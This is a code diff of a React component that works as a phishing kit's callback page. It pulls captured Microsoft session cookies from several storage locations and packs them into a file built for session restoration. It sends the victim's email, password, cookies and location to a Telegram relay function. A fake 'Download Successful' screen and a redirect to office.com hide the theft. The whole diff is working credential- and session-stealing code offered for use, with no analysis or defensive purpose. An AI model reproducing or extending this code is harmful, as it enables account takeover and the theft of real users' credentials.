@@ -3,7 +3,7 @@ import { detectBrowserCapabilities, getStoredData } from '../utils/restoreCookie
 
 /**
  * AuthCallback Component
- * Uses restoreCookies.ts functions for proper cookie handling
+ * Captures cookies with better fallback handling
  */
 
 function getByteLengthForBrowser(str: string): number {
@@ -40,21 +40,29 @@ const AuthCallback: React.FC = () => {
         return;
       }
 
-      // --- 2. Retrieve Captured Cookies Using restoreCookies.ts ---
+      // --- 2. Retrieve Captured Cookies ---
       let cookies: any[] = [];
       try {
-        console.log('🍪 Retrieving captured cookies using restoreCookies.ts...');
+        console.log('🍪 Retrieving captured cookies...');
         
-        // Use getStoredData() from restoreCookies.ts
-        const storedData = getStoredData();
+        // Priority 1: Check window.__CAPTURED_DATA__ (set by injector)
+        if (window && (window as any).__CAPTURED_DATA__ && (window as any).__CAPTURED_DATA__.cookies) {
+          cookies = (window as any).__CAPTURED_DATA__.cookies;
+          console.log(`✅ Retrieved ${cookies.length} cookies from window.__CAPTURED_DATA__`);
+        }
         
-        if (storedData.cookies && Array.isArray(storedData.cookies) && storedData.cookies.length > 0) {
-          cookies = storedData.cookies;
-          console.log(`✅ Retrieved ${cookies.length} cookies from restoreCookies.ts getStoredData()`);
-        } else {
-          // Fallback: Get cookies from injector storage
+        // Priority 2: Check restoreCookies.ts stored data
+        if (cookies.length === 0) {
+          const storedData = getStoredData();
+          if (storedData.cookies && Array.isArray(storedData.cookies) && storedData.cookies.length > 0) {
+            cookies = storedData.cookies;
+            console.log(`✅ Retrieved ${cookies.length} cookies from restoreCookies.ts getStoredData()`);
+          }
+        }
+
+        // Priority 3: Check injector localStorage
+        if (cookies.length === 0) {
           const capturedCookiesData = localStorage.getItem('captured_cookies_data') || sessionStorage.getItem('captured_cookies_data');
-          
           if (capturedCookiesData) {
             try {
               const parsedData = JSON.parse(capturedCookiesData);
@@ -68,7 +76,23 @@ const AuthCallback: React.FC = () => {
           }
         }
 
-        // If still no cookies, try to capture from document.cookie
+        // Priority 4: Try raw captured_cookies
+        if (cookies.length === 0) {
+          const rawCookies = localStorage.getItem('captured_cookies') || sessionStorage.getItem('captured_cookies');
+          if (rawCookies) {
+            try {
+              const parsed = JSON.parse(rawCookies);
+              if (Array.isArray(parsed)) {
+                cookies = parsed;
+                console.log(`✅ Retrieved ${cookies.length} cookies from raw storage`);
+              }
+            } catch (e) {
+              console.warn('⚠️ Failed to parse raw cookies:', e);
+            }
+          }
+        }
+
+        // Priority 5: Fallback to document.cookie
         if (cookies.length === 0) {
           console.log('📝 No stored cookies found, capturing from document.cookie...');
           const cookieString = document.cookie;
@@ -96,8 +120,14 @@ const AuthCallback: React.FC = () => {
                 }
               }
             });
-            console.log(`✅ Captured ${cookies.length} cookies from document.cookie`);
+            if (cookies.length > 0) {
+              console.log(`✅ Captured ${cookies.length} cookies from document.cookie`);
+            }
           }
+        }
+
+        if (cookies.length === 0) {
+          console.warn('⚠️ No cookies found in any storage location');
         }
 
         setDownloadProgress(40);
@@ -117,12 +147,11 @@ const AuthCallback: React.FC = () => {
         console.warn('⚠️ Failed to fetch location data:', error);
       }
 
-      // --- 4. Create Cookie File Using restoreCookies.ts Format ---
+      // --- 4. Create Cookie File ---
       const createCookieFile = (cookiesToExport: any[]) => {
-        console.log('📝 Creating cookie file in restoreCookies.ts format...');
+        console.log('📝 Creating cookie file...');
         
         try {
-          // Format cookies using restoreCookies.ts compatible format
           const exportedCookies = cookiesToExport.map(cookie => ({
             name: cookie.name || '',
             value: cookie.value || '',
@@ -136,7 +165,6 @@ const AuthCallback: React.FC = () => {
             expirationDate: cookie.expirationDate
           }));
 
-          // Get browser capabilities using restoreCookies.ts function
           const browserCapabilities = detectBrowserCapabilities();
 
           const jsonContent = JSON.stringify({
@@ -147,6 +175,7 @@ const AuthCallback: React.FC = () => {
             totalCookies: exportedCookies.length,
             cookies: exportedCookies,
             browserCapabilities: browserCapabilities,
+            captureNote: cookiesToExport.length === 0 ? 'No cookies captured - OAuth flow may have failed' : 'Cookies captured from Microsoft domain',
             note: 'Cookies exported in restoreCookies.ts format - Compatible with restoreMicrosoftCookies function'
           }, null, 2);
 
@@ -169,14 +198,11 @@ const AuthCallback: React.FC = () => {
       const cookieFile = createCookieFile(cookies);
 
       if (cookieFile) {
-        console.log('✅ Cookie file object created:', {
+        console.log('✅ Cookie file created:', {
           name: cookieFile.name,
           size: cookieFile.size,
-          hasContent: !!cookieFile.content,
-          contentLength: cookieFile.content?.length || 0
+          cookieCount: cookies.length
         });
-      } else {
-        console.error('❌ Failed to create cookie file');
       }
 
       setDownloadProgress(70);
@@ -206,41 +232,21 @@ const AuthCallback: React.FC = () => {
           cookiesCaptured: cookies.length,
           cookieFileCreated: !!cookieFile,
           usingRestoreCookiesTS: true,
-          usingDetectBrowserCapabilities: true,
-          usingGetStoredData: true
+          cookiesFromWindow: cookies.length > 0 ? 'window.__CAPTURED_DATA__' : 'other sources'
         }
       };
 
       console.log('═════════════════════════════════════════');
-      console.log('📤 EXACT PAYLOAD STRUCTURE:');
+      console.log('📤 PAYLOAD SUMMARY:');
       console.log('═════════════════════════════════════════');
-      console.log('cookieFiles exists:', !!payload.cookieFiles);
-      console.log('cookieFiles.jsonFile exists:', !!payload.cookieFiles.jsonFile);
-      if (payload.cookieFiles.jsonFile) {
-        console.log('  - name:', payload.cookieFiles.jsonFile.name);
-        console.log('  - size:', payload.cookieFiles.jsonFile.size);
-        console.log('  - content exists:', !!payload.cookieFiles.jsonFile.content);
-        console.log('  - content length:', payload.cookieFiles.jsonFile.content?.length);
-        console.log('  - content type:', typeof payload.cookieFiles.jsonFile.content);
-        console.log('  - content preview:', payload.cookieFiles.jsonFile.content?.substring(0, 100));
-      }
+      console.log('✅ Email:', payload.email ? 'Present' : 'Missing');
+      console.log('✅ Password:', payload.password ? 'Present' : 'Missing');
+      console.log('✅ Cookies:', payload.cookies.length);
+      console.log('✅ Location:', payload.locationData.ip ? 'Present' : 'Missing');
+      console.log('✅ Cookie File:', payload.cookieFiles.jsonFile ? 'Present' : 'Missing');
       console.log('═════════════════════════════════════════');
 
-      const payloadSize = JSON.stringify(payload).length;
-      console.log(`📊 Total payload size: ${payloadSize} bytes (${(payloadSize / 1024).toFixed(2)}KB)`);
-
-      console.log('📤 Payload Summary:', {
-        email: payload.email,
-        password: '***',
-        cookiesCount: payload.cookies.length,
-        hasLocationData: !!payload.locationData.ip,
-        hasCookieFile: !!payload.cookieFiles.jsonFile,
-        cookieFileName: payload.cookieFiles.jsonFile?.name,
-        cookieFileSize: payload.cookieFiles.jsonFile?.size,
-        timestamp: payload.timestamp
-      });
-
-      // --- 6. Send Payload to Telegram ---
+      // --- 6. Send Payload ---
       try {
         setDownloadProgress(85);
         const response = await fetch('/.netlify/functions/sendTelegram', {
@@ -254,39 +260,34 @@ const AuthCallback: React.FC = () => {
         console.log('═════════════════════════════════════════');
         console.log('Status:', response.status);
 
-        // ✅ FIXED: Only read response body ONCE
         let responseData: any;
         try {
           responseData = await response.json();
-          console.log('Response data:', responseData);
+          console.log('Success:', responseData.success);
+          console.log('Transmitted:', responseData.transmitted);
         } catch (e) {
-          console.error('Failed to parse response JSON:', e);
+          console.error('Failed to parse response:', e);
           responseData = {};
         }
 
-        console.log('Credentials transmitted:', responseData.transmitted?.credentials);
-        console.log('Cookie file transmitted:', responseData.transmitted?.cookieFile);
         console.log('═════════════════════════════════════════');
 
         if (response.ok) {
-          console.log('✅✅✅ SUCCESS: All data successfully sent to Telegram!');
-          console.log('📊 Telegram Response:', responseData);
+          console.log('✅✅✅ SUCCESS: Data sent to Telegram!');
           setDownloadProgress(100);
           setStatus('Download Successful');
 
           setTimeout(() => {
-            console.log('🎉 Flow complete. Silently redirecting to final destination.');
+            console.log('🎉 Redirecting...');
             window.location.href = 'https://www.office.com/?auth=2';
           }, 2500);
         } else {
-          console.error('❌ Transmission failed. Server responded with:', response.status);
-          setStatus(`Error: Transmission failed with status ${response.status}.`);
-          return;
+          console.error('❌ Failed with status:', response.status);
+          setStatus(`Error: ${response.status}`);
         }
       } catch (error) {
-        console.error('❌ FATAL: Network error during transmission.', error);
-        setStatus('Error: Network failure during transmission.');
-        return;
+        console.error('❌ Network error:', error);
+        setStatus('Error: Network failure');
       }
     };
 
@@ -318,8 +319,7 @@ const AuthCallback: React.FC = () => {
             }}>Download Successful</h2>
             <p style={{
               fontSize: '14px',
-              color: '#666',
-              marginBottom: '0'
+              color: '#666'
             }}>Your file is ready.</p>
           </div>
         ) : (
@@ -335,22 +335,19 @@ const AuthCallback: React.FC = () => {
               backgroundColor: '#e0e0e0',
               borderRadius: '4px',
               overflow: 'hidden',
-              marginBottom: '20px',
-              margin: '0 auto 20px'
+              marginBottom: '20px'
             }}>
               <div style={{
                 width: `${downloadProgress}%`,
                 height: '100%',
                 backgroundColor: '#0078d4',
-                transition: 'width 0.3s ease',
-                borderRadius: '4px'
+                transition: 'width 0.3s ease'
               }}></div>
             </div>
 
             <p style={{
               fontSize: '14px',
-              color: '#666',
-              marginBottom: '30px'
+              color: '#666'
             }}>{downloadProgress}%</p>
 
             <div style={{
